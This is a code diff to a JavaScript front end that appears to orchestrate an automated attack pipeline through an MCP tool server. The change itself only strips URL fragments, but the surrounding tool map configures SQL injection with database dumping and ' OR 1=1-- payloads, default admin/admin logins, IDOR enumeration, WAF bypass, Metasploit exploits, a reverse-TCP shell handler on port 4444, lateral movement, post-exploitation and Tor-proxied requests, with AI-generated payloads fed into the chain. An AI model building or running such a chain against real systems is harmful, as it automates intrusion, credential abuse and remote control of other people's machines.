@@ -1231,11 +1231,12 @@ MANDATORY CHAINING RULES:
     return () => clearInterval(id);
   }, [mcpUrl]);
 
+  const ct = (t) => t.split('#')[0].replace(/\/$/, '');  // strip SPA fragment before appending paths
   const TOOL_MAP = {
     subfinder:    { tool: 'subfinder', args: (t) => ({ domain: t.replace(/https?:\/\//, '').split('/')[0], flags: '-silent -all -recursive -max-depth 3' }) },
     httpx:        { tool: 'httpx',     args: (t) => ({ target: t, flags: '-status-code -title -tech-detect -cdn -ip -cname -server -ports 80,443,8080,8443,8000,8888,3000,4000,5000,9000,9090 -follow-redirects -random-agent -silent' }) },
     ghauri:       { tool: 'ghauri',    args: (t) => ({ url: t, flags: '--dbs --batch --forms --crawl=2 --level=3' }) },
-    ffuf:         { tool: 'ffuf',      args: (t) => ({ url: `${t}/FUZZ`, extensions: 'php,asp,aspx,jsp,txt,bak,old,zip,env,conf,log,json,xml,yaml', flags: '-mc 200,201,204,301,302,307,403 -fc 404,429 -recursion -recursion-depth 2 -t 50 -timeout 10' }) },
+    ffuf:         { tool: 'ffuf',      args: (t) => ({ url: `${ct(t)}/FUZZ`, extensions: 'php,asp,aspx,jsp,txt,bak,old,zip,env,conf,log,json,xml,yaml', flags: '-mc 200,201,204,301,302,307,403 -fc 404,429 -recursion -recursion-depth 2 -t 50 -timeout 10' }) },
     aquatone:     { tool: 'aquatone',  args: (t) => ({ hosts: t, flags: '-ports xlarge -timeout 3000' }) },
     burp_suite:   { tool: 'shell',     args: ()  => ({ command: 'nohup burpsuite &>/dev/null &' }) },
     naabu_scan:   { tool: 'nmap',      args: (t) => ({ target: t.replace(/https?:\/\//, '').split('/')[0], flags: '-sV -sC --script=http-title,http-headers,http-auth-finder,http-methods,ssl-cert,banner,vuln -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,587,636,993,995,1433,1521,2375,3000,3306,3389,4000,4443,4848,5000,5432,5900,5984,6379,7001,8000,8080,8081,8443,8444,8888,9000,9090,9200,9300,10000,27017 --min-rate 3000 -Pn --open', timeout: 180 }) },
@@ -1321,23 +1322,23 @@ fi
 `.trim() }) },
     waf_bypass:     { tool: 'waf_bypass',     args: (t) => ({ target: t, mode: 'full' }) },
     msf_exploit:    { tool: 'msf_exploit',    args: (t, cve) => ({ target: t.replace(/https?:\/\//, '').split('/')[0], cve: cve || 'recent', lport: '4444' }) },
-    payload_mutate: { tool: 'payload_mutate', args: (t) => ({ target: t + '?id=FUZZ', payload: "' OR 1=1--", type: 'sqli' }) },
+    payload_mutate: { tool: 'payload_mutate', args: (t) => ({ target: ct(t) + '?id=FUZZ', payload: "' OR 1=1--", type: 'sqli' }) },
     crawl_auth:     { tool: 'crawl_auth',     args: (t) => ({ target: t, username: 'admin', password: 'admin' }) },
-    idor_test:      { tool: 'idor_test',      args: (t) => ({ target: t + '/api/user/1', range: '1-100' }) },
+    idor_test:      { tool: 'idor_test',      args: (t) => ({ target: ct(t) + '/api/user/1', range: '1-100' }) },
     second_order:   { tool: 'second_order',   args: (t) => ({ target: t, inject_path: '/register', trigger_path: '/profile', field: 'username' }) },
     bizlogic_fuzz:  { tool: 'bizlogic_fuzz',  args: (t) => ({ target: t, endpoint: '/cart/add', mode: 'all' }) },
     evasion_scan:   { tool: 'evasion_scan',   args: (t) => ({ target: t, mode: 'full' }) },
     c2_handler:     { tool: 'c2_handler',     args: ()  => ({ payload: 'linux/x86/shell/reverse_tcp', lport: '4444' }) },
     lateral_move:   { tool: 'lateral_move',   args: (t) => ({ pivot_host: t.replace(/https?:\/\//, '').split('/')[0], mode: 'enum' }) },
     playwright_crawl:{ tool: 'playwright_crawl', args: (t) => ({ target: t, depth: 2, actions: 'all', timeout: 300 }) },
-    adaptive_mutate:{ tool: 'adaptive_mutate',  args: (t) => ({ target: t + '?id=INJECT', payload: "' OR 1=1--", type: 'sqli', rounds: 5 }) },
+    adaptive_mutate:{ tool: 'adaptive_mutate',  args: (t) => ({ target: ct(t) + '?id=INJECT', payload: "' OR 1=1--", type: 'sqli', rounds: 5 }) },
     cve_rag:        { tool: 'cve_rag',         args: (t) => ({ product: 'apache', version: 'detected', severity: 'high', limit: 10 }) },
-    session_manage: { tool: 'session_manage',  args: (t) => ({ target: t + '/login', action: 'login', username: 'admin', password: 'admin' }) },
+    session_manage: { tool: 'session_manage',  args: (t) => ({ target: ct(t) + '/login', action: 'login', username: 'admin', password: 'admin' }) },
     mitmproxy_scan:  { tool: 'mitmproxy_scan',  args: (t) => ({ target: t, port: 8080, mode: 'fuzz', duration: 30 }) },
     info_disclosure: { tool: 'info_disclosure', args: (t) => ({ target: t, deep: true }) },
     session_chain:   { tool: 'session_chain',   args: (t) => ({ target: t, username: 'admin', password: 'admin', id_range: '1-100' }) },
     post_exploit:    { tool: 'post_exploit',    args: (t) => ({ host: t.replace(/https?:\/\//, '').split('/')[0], session: '1', lport: '4444' }) },
-    dynamic_mutate:  { tool: 'dynamic_mutate',  args: (t) => ({ target: t + '?id=FUZZ', payloads: [], waf_fingerprint: 'unknown' }) },
+    dynamic_mutate:  { tool: 'dynamic_mutate',  args: (t) => ({ target: ct(t) + '?id=FUZZ', payloads: [], waf_fingerprint: 'unknown' }) },
     proxychains_wrap:{ tool: 'proxychains_wrap', args: (t) => ({ command: `curl -si --max-time 10 ${t}`, proxy: 'tor' }) },
     cve_rag_local:   { tool: 'cve_rag_local',   args: (t) => ({ product: t.replace(/https?:\/\//, '').split('/')[0], version: 'detected' }) },
     param_discover:  { tool: 'param_discover',  args: (t) => ({ url: t, method: 'GET' }) },
@@ -1618,7 +1619,7 @@ Responde em JSON: {"api_endpoints":[], "idor_candidates":[], "hardcoded_secrets"
                 if (dynJson.sqli_payloads?.length || dynJson.xss_payloads?.length) {
                   const allPayloads = [...(dynJson.sqli_payloads || []), ...(dynJson.xss_payloads || [])];
                   setLog(prev => [...prev, { t: 'ok', m: `Dynamic payloads: ${allPayloads.length} gerados (${wafFp}) → testando...` }]);
-                  const dynArgs = { target: target + '?id=FUZZ', payloads: allPayloads, waf_fingerprint: wafFp };
+                  const dynArgs = { target: target.split('#')[0] + '?id=FUZZ', payloads: allPayloads, waf_fingerprint: wafFp };
                   const dynR = await fetch(`${mcpUrl}/call/dynamic_mutate`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(dynArgs) });
                   const dynRd = await dynR.json();
                   allResults.push({ key: 'dynamic_mutate', out: (dynRd.output || '').slice(0, 2000) });
